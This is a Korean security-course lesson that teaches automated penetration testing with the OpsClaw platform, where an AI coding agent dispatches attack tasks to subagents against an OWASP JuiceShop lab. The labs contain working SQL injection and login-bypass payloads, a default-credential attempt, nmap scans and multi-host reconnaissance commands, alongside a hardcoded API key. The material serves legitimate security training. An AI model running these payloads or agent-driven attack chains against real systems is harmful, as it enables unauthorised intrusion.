# Week 14: 자동화 침투 테스트 (OpsClaw 활용)

## 학습 목표

- OpsClaw 플랫폼의 아키텍처와 API를 이해한다
- execute-plan API로 다단계 공격을 자동 실행할 수 있다
- Playbook 기반 공격 재현의 장점을 설명할 수 있다
- PoW(Proof of Work) 증거 체인의 원리와 감사 활용을 이해한다
- 수동 침투 테스트와 자동화 테스트의 차이를 비교한다

---

## 1. OpsClaw 플랫폼 개요

### 1.1 아키텍처

```
┌─────────────────────────────────────────┐
│            Claude Code (외부 마스터)      │
│     계획 수립 → API 호출 → 결과 분석     │
└───────────────┬─────────────────────────┘
                │ HTTP API
                ▼
┌─────────────────────────────────────────┐
│         Manager API (:8000)              │
│   프로젝트 관리 / 태스크 분배 / 증거 기록 │
│   PoW 블록체인 / 보상 시스템              │
└───────┬──────────┬──────────┬───────────┘
        │          │          │
        ▼          ▼          ▼
   ┌────────┐ ┌────────┐ ┌────────┐
   │SubAgent│ │SubAgent│ │SubAgent│
   │ secu   │ │  web   │ │  siem  │
   │:8002   │ │:8002   │ │:8002   │
   └────────┘ └────────┘ └────────┘
```

### 1.2 핵심 개념

| 개념 | 설명 |
|------|------|
| **Project** | 작업 단위. 한 번의 침투 테스트 = 하나의 프로젝트 |
| **Stage** | 프로젝트 상태: created → planning → executing → completed |
| **Task** | 개별 실행 명령. execute-plan에 배열로 전달 |
| **Evidence** | 각 Task의 실행 결과 (stdout, stderr, exit_code) |
| **PoW Block** | Task 실행의 암호학적 증명. 변조 불가능한 감사 증적 |
| **SubAgent** | 실제 명령을 실행하는 에이전트 (각 서버에 배포) |

### 1.3 API 인증

모든 API 호출에 인증 헤더가 필요하다.

```bash
# 환경 변수 설정
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

# 모든 curl 요청에 포함
-H "X-API-Key: $OPSCLAW_API_KEY"
```

---

## 2. OpsClaw API 워크플로우

### 2.1 기본 흐름

```
1. 프로젝트 생성 (POST /projects)
   ↓
2. 계획 단계 전환 (POST /projects/{id}/plan)
   ↓
3. 실행 단계 전환 (POST /projects/{id}/execute)
   ↓
4. 태스크 실행 (POST /projects/{id}/execute-plan)
   ↓
5. 결과 확인 (GET /projects/{id}/evidence/summary)
   ↓
6. 완료 보고서 (POST /projects/{id}/completion-report)
```

### 2.2 주요 API 엔드포인트

| 메서드 | 경로 | 설명 |
|--------|------|------|
| POST | /projects | 프로젝트 생성 |
| POST | /projects/{id}/plan | 계획 단계 전환 |
| POST | /projects/{id}/execute | 실행 단계 전환 |
| POST | /projects/{id}/execute-plan | 태스크 배열 실행 |
| POST | /projects/{id}/dispatch | 단일 명령 실행 |
| GET | /projects/{id}/evidence/summary | 증거 요약 |
| POST | /projects/{id}/completion-report | 완료 보고서 생성 |
| GET | /pow/blocks | PoW 블록 조회 |
| GET | /pow/verify | 체인 무결성 검증 |
| GET | /pow/leaderboard | 보상 랭킹 |
| GET | /projects/{id}/replay | 작업 재생 |

---

## 3. execute-plan: 다단계 공격 실행

### 3.1 Task 구조

```json
{
  "tasks": [
    {
      "order": 1,
      "instruction_prompt": "실행할 명령어",
      "risk_level": "low|medium|high|critical",
      "subagent_url": "http://대상서버:8002"
    }
  ],
  "subagent_url": "http://기본서버:8002"
}
```

### 3.2 risk_level 설명

| 레벨 | 설명 | 동작 |
|------|------|------|
| low | 읽기 전용 (스캔, 조회) | 즉시 실행 |
| medium | 제한적 변경 (파일 생성) | 즉시 실행 |
| high | 시스템 변경 (설정 수정) | 즉시 실행 |
| critical | 파괴적 변경 (삭제, 초기화) | dry_run 강제, confirmed:true 필요 |

### 3.3 SubAgent URL 목록

| 서버 | SubAgent URL |
|------|-------------|
| opsclaw (로컬) | http://localhost:8002 |
| secu | http://192.168.208.150:8002 또는 http://10.20.30.1:8002 |
| web | http://192.168.208.151:8002 또는 http://10.20.30.80:8002 |
| siem | http://192.168.208.152:8002 또는 http://10.20.30.100:8002 |

---

## 4. PoW 증거 체인

### 4.1 PoW(Proof of Work)란?

각 Task 실행 결과를 암호학적 해시로 연결한 블록체인 구조이다.

```
Block 1              Block 2              Block 3
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ prev_hash: 0 │←───│ prev_hash    │←───│ prev_hash    │
│ task: nmap   │    │ task: curl   │    │ task: sqlmap  │
│ result: ...  │    │ result: ...  │    │ result: ...   │
│ nonce: 12345 │    │ nonce: 67890 │    │ nonce: 11111  │
│ hash: abc... │    │ hash: def... │    │ hash: ghi...  │
└──────────────┘    └──────────────┘    └──────────────┘
```

### 4.2 PoW의 감사 활용

- **변조 감지**: 하나의 블록이라도 수정되면 해시 체인이 깨짐
- **실행 증명**: 특정 시간에 특정 명령이 실행되었음을 증명
- **감사 추적**: 침투 테스트의 모든 단계를 투명하게 기록
- **보고서 작성**: 자동화된 증거 수집으로 보고서 품질 향상

---

## 5. 실습

### 실습 1: 프로젝트 생성 및 기본 워크플로우

```bash
# 환경 변수 설정
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

# 1. 프로젝트 생성
PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week14-automated-pentest",
    "request_text": "JuiceShop 대상 자동화 침투 테스트",
    "master_mode": "external"
  }')

echo "$PROJECT" | python3 -m json.tool

# 프로젝트 ID 추출
PROJECT_ID=$(echo "$PROJECT" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "프로젝트 ID: $PROJECT_ID"

# 2. Stage 전환: created → planning → executing
curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool

curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

### 실습 2: 정찰 단계 자동화 (T1046, T1595)

```bash
# 정찰 태스크 실행
curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "nmap -sT -p 22,80,3000,443,8080 10.20.30.80",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "curl -s -o /dev/null -w \"%{http_code}\" http://10.20.30.80:3000/",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "curl -s http://10.20.30.80:3000/rest/products/search?q=test | head -c 500",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool

# 예상 출력:
# {
#   "project_id": "...",
#   "results": [
#     {"order": 1, "status": "success", "exit_code": 0, ...},
#     {"order": 2, "status": "success", "exit_code": 0, ...},
#     {"order": 3, "status": "success", "exit_code": 0, ...}
#   ]
# }
```

### 실습 3: 웹 공격 단계 자동화 (T1190)

```bash
# SQL Injection 테스트 태스크
curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 4,
        "instruction_prompt": "curl -s \"http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--\" | python3 -c \"import sys,json; data=json.load(sys.stdin); print(f\\\"결과 수: {len(data.get(\\\\\\\"data\\\\\\\", []))}개\\\")\" 2>/dev/null || echo \"응답 파싱 실패\"",
        "risk_level": "medium",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' | head -c 300",
        "risk_level": "medium",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 6,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"\\\" or 1=1--\",\"password\":\"a\"}' | head -c 300",
        "risk_level": "medium",
        "subagent_url": "http://localhost:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

### 실습 4: 증거 확인

```bash
# 증거 요약 조회
echo "===== 증거 요약 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/$PROJECT_ID/evidence/summary" | python3 -m json.tool

# 프로젝트 재생 (모든 태스크 타임라인)
echo ""
echo "===== 작업 재생 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/$PROJECT_ID/replay" | python3 -m json.tool
```

### 실습 5: PoW 체인 검증

```bash
# PoW 블록 조회
echo "===== PoW 블록 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/blocks?agent_id=http://localhost:8002" | python3 -m json.tool

# 체인 무결성 검증
echo ""
echo "===== 체인 무결성 검증 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/verify?agent_id=http://localhost:8002" | python3 -m json.tool

# 예상 출력:
# {
#   "valid": true,
#   "blocks": 6,
#   "orphans": 0,
#   "tampered": []
# }

# 보상 랭킹
echo ""
echo "===== 보상 랭킹 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/leaderboard" | python3 -m json.tool
```

### 실습 6: 완료 보고서 생성

```bash
# 완료 보고서 작성
curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/completion-report" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "JuiceShop 대상 자동화 침투 테스트 완료",
    "outcome": "success",
    "work_details": [
      "정찰: nmap 포트 스캔 (22, 80, 3000 포트 발견)",
      "웹 분석: REST API 엔드포인트 확인",
      "SQL Injection: 제품 검색 API에서 SQLi 취약점 확인",
      "인증 우회: 로그인 API에서 SQL Injection으로 인증 우회 시도",
      "증거: 모든 실행 결과가 PoW 체인에 기록됨"
    ]
  }' | python3 -m json.tool

# 예상 출력:
# {
#   "project_id": "...",
#   "status": "completed",
#   "report": { ... }
# }
```

### 실습 7: 다중 서버 공격 자동화

```bash
# 새 프로젝트: 전체 인프라 스캔
PROJECT2=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week14-multi-server-scan",
    "request_text": "전체 인프라 정찰 스캔",
    "master_mode": "external"
  }')
PID2=$(echo "$PROJECT2" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

curl -s -X POST "http://localhost:8000/projects/$PID2/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID2/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 각 서버별 SubAgent로 명령 분배
curl -s -X POST "http://localhost:8000/projects/$PID2/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "hostname && ip addr show | grep inet | head -5",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "hostname && ip addr show | grep inet | head -5",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "hostname && ip addr show | grep inet | head -5",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "hostname && ip addr show | grep inet | head -5",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.100:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool

echo ""
echo "===== 전체 서버 정보 수집 결과 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/$PID2/evidence/summary" | python3 -m json.tool
```

---

## 6. 수동 vs 자동화 침투 테스트 비교

| 항목 | 수동 테스트 | OpsClaw 자동화 |
|------|------------|---------------|
| **속도** | 느림 (사람이 직접 입력) | 빠름 (API 일괄 실행) |
| **재현성** | 낮음 (매번 다르게 실행) | 높음 (동일 Playbook 재실행) |
| **증거 수집** | 수동 스크린샷/메모 | 자동 PoW 체인 기록 |
| **다중 서버** | 번거로움 (서버별 SSH) | 간편 (SubAgent URL만 변경) |
| **창의성** | 높음 (즉흥적 판단) | 낮음 (사전 정의된 시나리오) |
| **비용** | 높음 (전문가 시간) | 낮음 (한 번 작성, 반복 사용) |
| **오류 가능성** | 있음 (타이핑 실수) | 낮음 (검증된 명령어) |
| **감사 추적** | 부분적 | 완전 (블록체인 증명) |

### 최선의 접근: 하이브리드

```
자동화로 할 일:
  - 정찰 스캔 (포트, 서비스, 버전)
  - 알려진 취약점 테스트 (SQLi, XSS 패턴)
  - 반복적인 확인 작업
  - 증거 수집 및 기록

수동으로 할 일:
  - 비즈니스 로직 취약점 분석
  - 다단계 공격 체인 설계
  - 예상치 못한 취약점 탐색
  - 결과 해석 및 위험도 평가
```

---

## 7. 실습 과제

1. **자동화 공격 체인**: OpsClaw를 사용하여 JuiceShop에 대한 5단계 이상의 공격 체인을 설계하고 실행하라. 각 단계의 ATT&CK 기법 ID를 명시할 것.
2. **PoW 검증 보고서**: 실행된 모든 태스크의 PoW 블록을 조회하고, 체인 무결성이 유지되었음을 확인하는 보고서를 작성하라.
3. **비교 분석**: 동일한 공격을 수동(Week 05 방식)과 자동화(OpsClaw)로 각각 수행하고, 소요 시간, 정확도, 증거 품질을 비교하라.

---

## 8. 핵심 정리

- OpsClaw는 **프로젝트 → 계획 → 실행 → 증거 → 보고**의 체계적 워크플로우를 제공한다
- **execute-plan**으로 다단계 공격을 한 번에 자동 실행할 수 있다
- **PoW 체인**은 변조 불가능한 감사 증적을 자동 생성한다
- **SubAgent**를 통해 여러 서버에 동시에 명령을 분배할 수 있다
- 자동화는 수동 테스트를 **대체하는 것이 아니라 보완**하는 것이다

**다음 주 예고**: Week 15(기말)에서는 전체 인프라에 대한 종합 침투 테스트를 수행하고, 전문적인 보고서를 작성한다.
